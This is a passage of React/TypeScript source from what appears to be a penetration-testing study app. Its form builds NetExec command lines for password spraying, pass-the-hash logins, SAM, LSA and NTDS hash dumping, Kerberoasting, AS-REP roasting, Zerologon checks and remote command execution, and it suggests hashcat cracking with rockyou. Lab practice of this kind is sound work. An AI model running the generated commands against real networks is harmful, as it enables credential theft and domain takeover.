  const [local, setLocal] = useState(false);
  const [port, setPort] = useState("");
  const [share, setShare] = useState("Scripts");
  const [pattern, setPattern] = useState("pass|kdbx|xml|config");
  const [outfile, setOutfile] = useState("kerb.txt");
  const [cmd, setCmd] = useState("whoami");

  const actions = NXC_ACTIONS.filter((a) => a.protocols.includes(proto));
  const picked = actions.find((a) => a.id === action) ?? actions[0];
  const host = cleanTarget(target);
  const domainOk = domain.trim() === "" || /^[A-Za-z0-9.-]+$/.test(domain.trim());
  const isFile = userModeIsFile(user);
  const userOk =
    picked.id === "zero" || auth === "anon" || (auth === "key" ? cleanPath(user) !== "" : cleanUser(user) !== "");
  const secretOk =
    picked.id === "zero" ||
    auth === "anon" ||
    auth === "cache" ||
    (auth === "hash" ? /^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$/.test(secret.trim()) : auth === "key" ? cleanPath(secret) !== "" : cleanLoose(secret).length > 0);
  const rockyou = /rockyou/i.test(secret) || /rockyou/i.test(user);
  const portOk = port.trim() === "" || (/^\d+$/.test(port.trim()) && Number(port) >= 1 && Number(port) <= 65535);
  const shareOk = picked.id !== "spider" || cleanPath(share) !== "";
  const patternOk = picked.id !== "spider" || /^[A-Za-z0-9|._*-]+$/.test(pattern);
  const outOk = !picked.outfile || cleanPath(outfile) !== "";
  const cmdOk = (picked.id !== "cmd" && picked.id !== "query") || (cleanLoose(cmd).length > 0 && !/[\n'`]/.test(cmd));
  const ready = Boolean(host) && domainOk && userOk && secretOk && !rockyou && portOk && shareOk && patternOk && outOk && cmdOk;

  let command = "";
  if (ready && picked) {
    const bits = ["nxc", proto, host];
    if (picked.id === "zero" || auth === "anon") {
      bits.push("-u ''", "-p ''");
    } else if (auth === "cache") {
      const name = prefixUser(cleanUser(user), domain, isFile);
      bits.push(`-u ${name}`, "--use-kcache");
    } else if (auth === "key") {
      bits.push(`-u ${cleanUser(user)}`, `--key ${cleanPath(secret)}`);
    } else if (auth === "hash") {
      const name = prefixUser(cleanUser(user), local ? "" : domain, isFile);
      bits.push(`-u ${name}`, `-H ${secret.trim().toLowerCase()}`);
    } else {
      const name = prefixUser(cleanUser(user), local ? "" : domain, isFile);
      bits.push(`-u ${name}`, `-p ${bashSingle(cleanLoose(secret))}`);
    }
    if (local && ["smb", "winrm", "mssql", "wmi"].includes(proto) && auth !== "cache" && auth !== "anon" && picked.id !== "zero") {
      bits.push("--local-auth");
    }
    if (port.trim()) bits.push(`--port ${port.trim()}`);
    if (picked.id === "shares") bits.push("--shares");
    if (picked.id === "users") bits.push("--users");
    if (picked.id === "groups") bits.push("--groups");
    if (picked.id === "active") bits.push("--active-users");
    if (picked.id === "passpol") bits.push("--pass-pol");
    if (picked.id === "rid") bits.push("--rid-brute");
    if (picked.id === "spider") bits.push(`--spider ${bashSingle(cleanPath(share))}`, `--pattern ${bashSingle(pattern)}`);
    if (picked.id === "gpp") bits.push("-M gpp_password");
    if (picked.id === "laps-ldap") bits.push("-M laps");
    if (picked.id === "laps-smb") bits.push("--laps");
    if (picked.id === "adcs") bits.push("-M adcs");
    if (picked.id === "deleg") bits.push("--trusted-for-delegation");
    if (picked.id === "kerb") bits.push(`--kerberoasting ${cleanPath(outfile)}`);
    if (picked.id === "asrep") bits.push(`--asreproast ${cleanPath(outfile)}`);
    if (picked.id === "blood") bits.push("--bloodhound", "-c All");
    if (picked.id === "sam") bits.push("--sam");
    if (picked.id === "lsa") bits.push("--lsa");
    if (picked.id === "ntds") bits.push("--ntds");
    if (picked.id === "loggedon") bits.push("--loggedon-users");
    if (picked.id === "spray") bits.push("--continue-on-success");
    if (picked.id === "cmd") bits.push(`-x ${bashSingle(cleanLoose(cmd))}`);
    if (picked.id === "query") bits.push(`-q ${bashSingle(cleanLoose(cmd))}`);
    if (picked.id === "zero") bits.push("-M zerologon");
    command = bits.join(" ");
  }

  const authChoices = authChoicesFor(proto);

  return (
    <Shell
      title="nxc"
      blurb="Check the login on one host before you scan the subnet. A hash uses -H. A local SAM hash also needs --local-auth."
      command={command}
      empty={rockyou ? "Rockyou does not belong in nxc. One password you already found." : "Fill in the target, the user, and the secret."}
      why={nxcWhy(proto, picked.id, auth, local)}
      note={picked.note}
      stop={Boolean(picked.stop) || rockyou}
      then={
        picked.id === "kerb"
          ? "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"
          : picked.id === "asrep"
            ? "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
            : picked.id === "auth"
              ? "A [+] on the DC means enumerate. A (Pwn3d!) means that host's local admin checks."
              : undefined
      }
    >
      <Field label="Protocol">
        <select
          className={control}
          value={proto}
          onChange={(e) => {
            const next = e.target.value;
            setProto(next);
            const allowed = NXC_ACTIONS.filter((a) => a.protocols.includes(next));
            if (!allowed.some((a) => a.id === action)) setAction(allowed[0].id);
            if (!authChoicesFor(next).some((a) => a.id === auth)) setAuth("pass");
          }}
        >
          <option value="smb">SMB</option>
          <option value="ldap">LDAP</option>
          <option value="winrm">WinRM</option>
          <option value="mssql">MSSQL</option>
          <option value="rdp">RDP</option>
          <option value="wmi">WMI</option>
          <option value="ssh">SSH</option>
          <option value="ftp">FTP</option>
        </select>
      </Field>
      <Field label="Action">
        <select
          className={control}
          value={picked.id}
          onChange={(e) => {
            const next = e.target.value;
            setAction(next);
            if (next === "kerb") setOutfile("kerb.txt");
            if (next === "asrep") setOutfile("asrep.txt");
            if (next === "zero") setAuth("anon");
          }}
        >
          {actions.map((a) => (
            <option key={a.id} value={a.id}>
              {a.label}
            </option>
          ))}
        </select>
      </Field>
      <Field label="Target">
        <input className={control} value={target} onChange={(e) => setTarget(e.target.value)} placeholder="10.10.10.5 or 10.10.10.0/24" />
      </Field>
      <Field label="Auth">
        <select className={control} value={authChoices.some((a) => a.id === auth) ? auth : "pass"} onChange={(e) => setAuth(e.target.value as typeof auth)} disabled={picked.id === "zero"}>
          {authChoices.map((a) => (
            <option key={a.id} value={a.id}>
              {a.label}
            </option>
          ))}
        </select>
      </Field>
      {picked.id !== "zero" && auth !== "anon" ? (
        <Field label={auth === "key" ? "Username" : isFile ? "Username file" : "Username"}>
          <input className={control} value={user} onChange={(e) => setUser(e.target.value)} placeholder={picked.id === "spray" ? "users.txt" : "user"} />
        </Field>
      ) : null}
      {picked.id !== "zero" && auth !== "anon" && auth !== "cache" ? (
        <Field label={auth === "hash" ? "NT hash" : auth === "key" ? "Private key" : "Password"}>
          <input className={control} value={secret} onChange={(e) => setSecret(e.target.value)} placeholder={auth === "hash" ? "32 hex" : ""} />
        </Field>
      ) : null}
      {picked.id !== "zero" ? (
        <LootPick
          kinds={proto === "ssh" ? ["user", "pass", "sshkey"] : ["user", "pass", "nt"]}
          onPick={(item) => {
            if (item.kind === "sshkey") {
              if (item.user) setUser(item.user);
              setProto("ssh");
              setAuth("key");
              setSecret("id_rsa");
              return;
            }
            if (item.user) setUser(item.user);
            if (item.kind === "pass" || item.kind === "nt") {
              setSecret(item.secret);
              setAuth(item.kind === "nt" ? "hash" : "pass");
            }
          }}
        />
      ) : null}
      {auth !== "key" && auth !== "anon" && picked.id !== "zero" ? (
        <Field label="Domain (optional)">
          <input className={control} value={domain} onChange={(e) => setDomain(e.target.value)} placeholder="corp.local" />
        </Field>
      ) : null}
      {["smb", "winrm", "mssql", "wmi"].includes(proto) ? (
        <Field label="Account type">
          <select className={control} value={local ? "local" : "domain"} onChange={(e) => setLocal(e.target.value === "local")}>
            <option value="domain">Domain login</option>
            <option value="local">Local account (--local-auth)</option>
          </select>
        </Field>
      ) : null}
      <Field label="Port (optional)">
        <input className={control} value={port} onChange={(e) => setPort(e.target.value)} inputMode="numeric" />
      </Field>
      {picked.id === "spider" ? (
        <>
          <Field label="Share">
            <input className={control} value={share} onChange={(e) => setShare(e.target.value)} />
          </Field>
          <Field label="Filename pattern">
            <input className={control} value={pattern} onChange={(e) => setPattern(e.target.value)} />
          </Field>
        </>
      ) : null}
      {picked.outfile ? (
        <Field label="Output file">
          <input className={control} value={outfile} onChange={(e) => setOutfile(e.target.value)} />
        </Field>
      ) : null}
      {picked.id === "cmd" || picked.id === "query" ? (
        <Field label={picked.id === "query" ? "SQL" : "Command"}>
          <input className={control} value={cmd} onChange={(e) => setCmd(e.target.value)} />
        </Field>
      ) : null}
    </Shell>
  );
}

function userModeIsFile(value: string) {
  return value.trim().endsWith(".txt") || value.includes("/");
}

function prefixUser(user: string, domain: string, isFile: boolean) {
  const d = domain.trim();
  if (!d || isFile || user.includes("/") || user.includes("\\")) return user;
  return `${d}/${user}`;
}

function authChoicesFor(proto: string) {
  const all = [
    { id: "pass" as const, label: "Password" },
    { id: "hash" as const, label: "NT hash" },
    { id: "anon" as const, label: "Anonymous" },
    { id: "cache" as const, label: "Kerberos ticket already on Kali" },
    { id: "key" as const, label: "Private key" },
  ];
  if (proto === "ssh") return all.filter((a) => a.id === "pass" || a.id === "key");
  if (proto === "ftp" || proto === "rdp") return all.filter((a) => a.id === "pass" || a.id === "anon");
  if (proto === "ldap" || proto === "winrm") return all.filter((a) => a.id !== "key");
  if (proto === "mssql" || proto === "wmi") return all.filter((a) => a.id === "pass" || a.id === "hash" || a.id === "anon");
  return all.filter((a) => a.id !== "key");
}

function nxcWhy(proto: string, action: string, auth: string, local: boolean) {
  const authBit =
    auth === "hash"
      ? "-H is the NT hash, not a password. "
      : auth === "cache"
        ? "--use-kcache uses the ticket already in KRB5CCNAME. You still pass -u so it knows which name is cached. "
        : auth === "anon"
          ? "Empty -u and -p is an anonymous attempt. "
          : auth === "key"
            ? "--key is the private key file. "
            : "-u is the user and -p is the password, quoted so symbols survive. ";
  const localBit = local ? "--local-auth treats the account as local to each target, which is what a SAM hash needs. " : "";
  const actionBit: Record<string, string> = {
    auth: "With no extra flag, nxc only checks the login.",
    shares: "--shares lists shares this login can see.",
    users: "--users lists accounts.",
    groups: "--groups lists groups.",
    active: "--active-users drops disabled accounts.",
    passpol: "--pass-pol prints the lockout policy. Read it before a spray.",
    rid: "--rid-brute asks for names by RID.",
    spider: "--spider walks one share. --pattern is a filename filter, not a content search.",
    gpp: "-M gpp_password searches SYSVOL for Group Policy preference passwords.",
    "laps-ldap": "-M laps reads LAPS passwords this user is allowed to see.",
    "laps-smb": "--laps does the LAPS read from SMB.",
    adcs: "-M adcs lists certificate templates and marks the vulnerable ones.",
    deleg: "--trusted-for-delegation lists unconstrained delegation.",
    kerb: "--kerberoasting requests a service ticket per SPN and writes the hashes to the file.",
    asrep: "--asreproast writes hashes for accounts that do not require pre-authentication.",
    blood: "--bloodhound -c All collects the set BloodHound imports. One collection.",
    sam: "--sam dumps local SAM hashes. You already need to be admin.",
    lsa: "--lsa dumps LSA secrets. You already need to be admin.",
    ntds: "--ntds dumps the domain hash database. Only on a DC you already own.",
    loggedon: "--loggedon-users shows who has a session.",
    spray: "--continue-on-success does not stop at the first hit, so you see every reuse of that one password.",
    cmd: "-x runs one command over the protocol. whoami tells you the context.",
    query: "-q runs one SQL statement.",
    zero: "-M zerologon checks CVE-2020-1472. It does not need a real user.",
  };
  return `nxc ${proto} talks to that service on the target. ${authBit}${localBit}${actionBit[action] ?? ""}`;
}

export function Builders({ tools }: { tools: ToolId[] }) {
  const [tab, setTab] = useState<ToolId>(tools[0] ?? "msfvenom");
  useEffect(() => {
    if (!tools.includes(tab)) setTab(tools[0] ?? "msfvenom");
  }, [tools, tab]);

  if (tools.length === 0) return null;
  const current = tools.includes(tab) ? tab : tools[0];

  return (
    <div className="flex min-w-0 flex-col gap-3">
      {tools.length > 1 ? (
        <div className="flex gap-2 overflow-x-auto">
          {tools.map((id) => (
            <button
              key={id}
              type="button"
              onClick={() => setTab(id)}
              className={
                "inline-flex min-h-11 shrink-0 items-center rounded-lg border px-3 font-mono text-sm " +
                (current === id ? "border-primary bg-raised text-fg" : "border-border bg-bg text-muted")
              }
            >
              {LABELS[id]}
            </button>
          ))}
        </div>
      ) : null}
      {current === "msfvenom" ? <VenomBuilder /> : null}
      {current === "identify" ? <HashIdentifier /> : null}
      {current === "hashcat" ? <HashcatBuilder /> : null}
      {current === "john" ? <JohnBuilder /> : null}
      {current === "hydra" ? <HydraBuilder /> : null}
      {current === "nxc" ? <NxcBuilder /> : null}
      {current === "local" ? <LocalMatch /> : null}
      {current === "udp" ? (
        <div className="flex min-w-0 flex-col gap-4">
          <UdpScan />
          <NmapScan />
          <SearchsploitRun />
        </div>
      ) : null}
      {current === "tunnel" ? <TunnelBuilder /> : null}
      {current === "wfuzz" ? <WfuzzBuilder /> : null}
      {current === "impacket" ? <ImpacketBuilder /> : null}
    </div>
  );
}
